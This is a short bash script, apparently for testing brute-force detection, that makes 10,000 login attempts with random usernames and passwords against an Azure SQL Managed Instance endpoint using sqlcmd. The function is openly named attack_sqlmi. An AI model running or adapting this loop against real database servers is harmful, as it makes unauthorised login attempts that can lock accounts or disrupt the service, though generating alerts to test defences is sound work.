#!/usr/bin/env bash
​
gen_string() {

    openssl rand -base64 8 | tr -dc '[:alpha:]'

}

 

attack_sqlmi() {

    times=$1

 

    for i in $(seq $times); do

        username=$(gen_string)

        password=$(gen_string)

 

        echo "Attack run ${i}: Username=$username / Password=$password"

 

        # Connect to SQL MI Instance.

        #

        sqlcmd -S server.database.windows.net -U $username -P $password

    done

}


attack_sqlmi 10000